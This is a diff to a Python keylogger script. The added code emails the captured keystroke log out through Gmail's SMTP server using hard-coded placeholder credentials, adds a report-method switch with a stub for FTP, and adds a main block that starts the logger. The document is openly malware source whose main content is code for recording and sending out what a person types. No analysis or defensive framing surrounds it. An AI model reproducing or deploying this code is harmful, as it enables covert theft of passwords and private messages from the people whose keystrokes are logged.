@@ -4,12 +4,16 @@
 
 import keyboard
 import datetime
+from smtplib import SMTP
 from threading import Thread
 from time import sleep
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
 # global variables
 INTERVAL = 60
-EMAIL = ""
-PW = ""
+EMAIL = "test@test.come"
+PW = "test"
 
 
 
@@ -87,6 +91,23 @@ class keylogger:
 
         print(f"[+] Saved {self.filename}.txt")
     
+
+    # Email function
+    def report_to_email(self):
+        message = MIMEMultipart()
+        message['From'] = EMAIL
+        message['To'] = EMAIL
+        message['Subject'] = 'Log Data from Key Logger'
+        message.attach(MIMEText(self.log, 'plain'))
+
+        with SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(EMAIL, PW)
+            server.sendmail(EMAIL,EMAIL, message.as_string())
+
+
+
+
     def report(self):
         while True:
             if self.log:
@@ -97,12 +118,19 @@ class keylogger:
                 if self.report_method == "local":
                     self.report_to_file()
 
+                elif self.report_method == "email":
+                    self.report_to_email()
+
+                elif self.report_method == "ftp": # to be implemented
+                    pass
+
+
                 # reset variables
                 self.start_date = datetime.now()
             
             self.log = ""
             
-            t = INTERVAL
+            t = self.update_interval
 
             # this is interval periods, could implement this in threads so the load is more balanced
             while t != 0:
@@ -110,3 +138,6 @@ class keylogger:
                 sleep(1)
 
 
+if __name__ == "__main__":
+    logger = keylogger(INTERVAL, "local")
+    logger.start()
